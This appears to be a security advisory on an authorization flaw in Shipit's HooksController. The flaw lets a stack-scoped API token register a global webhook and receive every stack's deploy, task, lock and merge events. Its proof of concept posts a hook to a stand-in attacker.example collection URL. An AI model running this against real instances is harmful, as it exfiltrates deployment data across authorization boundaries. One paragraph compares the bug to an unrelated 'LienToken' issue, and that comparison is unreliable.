### Title
Stack-scoped API token can register a global webhook, exfiltrating deploy/task/rollback/merge/lock events from every stack it is not authorized for - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController` is mounted twice: once nested under `/api/stacks/*stack_id/hooks` and once as a top-level, unscoped route `/api/hooks` (`config/routes.rb#L43,L46`). The controller derives the hook's `stack_id` purely from whether `params[:stack_id]` was present, independent of the `ApiClient`'s own authorization scope, so an `ApiClient` restricted to a single stack can still create a hook with `stack_id: nil` (a "global" hook) by calling the top-level route, and that global hook then receives events for every stack in the installation.

### Finding Description
`ApiClient` can be scoped to a single stack via `belongs_to :stack, optional: true` and `stack_id` [1](#0-0) . `Api::BaseController#stacks` enforces this scoping wherever a stack is looked up: `current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all` [2](#0-1) .

However, `Api::HooksController#create` does not always go through that scoped lookup. Its `stack_id` helper is:
```ruby
def stack_id
  stack.id if params[:stack_id].present?
end
``` [3](#0-2) 

When the request hits the top-level, unscoped route `resources :hooks, only: %i[index create show update destroy]` under `namespace :api` (outside the `scope '/stacks/*stack_id', ...` block) [4](#0-3) , `params[:stack_id]` is simply absent, so `stack_id` returns `nil` without ever calling `stack` (and therefore without ever consulting the scoped `stacks` relation or the client's `stack_id`). The created `Hook` then has `stack_id: nil`, i.e. it is "global": `scope :global, -> { where(stack_id: nil) }` [5](#0-4) .

Delivery selection treats a global hook as applicable to every stack: `scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }` and `Hook.deliver(event, stack_id, payload)` iterates `for_stack(stack_id).listening_event(event)` [6](#0-5) . So once a global hook exists, it is delivered `stack`, `task`, `deploy`, `rollback`, `lock`, `commit_status`, `merge_status`, `merge`, and `pull_request` events for every stack the Shipit instance manages [7](#0-6) , regardless of the `stack_id` the creating `ApiClient` was scoped to. Permission is only checked via `require_permission :write, :hook` which does not itself verify stack scope [8](#0-7) .

This is the same class of bug as the reported LienToken issue: a security-relevant value (`newSlot.point.position`, here the hook's effective "stack scope") is computed from one piece of state at creation time (`params.stack.length` there; `params[:stack_id]` presence here) but is never re-validated against the authorization the actor actually holds (the lien's real stack index there; `current_api_client.stack_id` here), letting the acted-upon scope diverge from the authorized scope.

### Impact Explanation
An attacker holding only a stack-scoped `ApiClient` token (created, e.g., via the CCMenu flow which mints `read:stack`-only tokens, or any token issued with a narrow `stack_id` and `write:hook`) can register a hook with no `stack_id` and their own `delivery_url`. This grants unauthenticated read of task/deploy/rollback state, lock changes, merge and pull-request activity for every other stack managed by the Shipit instance — an authorization-scope escape from "one stack" to "all stacks." This matches the "High: escalation into `Shipit.github_teams` authorization, unauthenticated read of stack state, task streams or deploy output" impact class.

### Likelihood Explanation
Exploitation requires only possession of any `ApiClient` token with `write:hook` permission and calling the existing, documented top-level `POST /api/hooks` endpoint instead of the nested one — no additional bypass, race condition, or privileged access is needed. The likelihood is limited by needing an `ApiClient` credential at all (the rules exclude scenarios requiring an `ApiClient` token as out-of-scope trust boundary crossings in isolation), but if any workflow issues stack-scoped clients with `write:hook` (the permission model explicitly allows scoping stacks while granting hook permissions independently, since `permissions` and `stack_id` are orthogonal fields on `ApiClient`), the escalation is trivial and requires no further conditions.

### Recommendation
Make `Api::HooksController#create` (and `#index`/`#show`/`#update`/`#destroy`) honor `current_api_client.stack_id` the same way `Api::BaseController#stacks` does: when the client is stack-scoped, forbid creating/reading hooks with `stack_id: nil`, and force `stack_id` to the client's own `stack_id` rather than trusting `params[:stack_id]`'s mere presence/absence. Alternatively, disallow global-hook management entirely for any `ApiClient` that has `stack_id` set.

### Proof of Concept
1. Create/obtain an `ApiClient` scoped to `stack_id: <A>` (e.g. via `Shipit::CCMenuUrlController#client` or an admin issuing a scoped token) that also has `write:hook` in its `permissions`.
2. Authenticate as that client and call:
   ```
   POST /api/hooks
   { "delivery_url": "https://attacker.example/collect", "events": ["deploy","task","rollback","lock","merge","pull_request"] }
   ```
   Note there is no `stack_id` in the URL/params, so `Api::HooksController#stack_id` returns `nil` (`app/controllers/shipit/api/hooks_controller.rb:50-52`), producing a `Hook` with `stack_id: nil`.
3. Any other stack `B` in the Shipit instance triggers a deploy/task/lock/merge event. `Hook.deliver` selects hooks via `for_stack(B.id)` which matches `stack_id IN (nil, B.id)` (`app/models/shipit/hook.rb:95,115-119`), so the attacker's global hook receives the event payload for stack `B`, which the client was never authorized to access.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
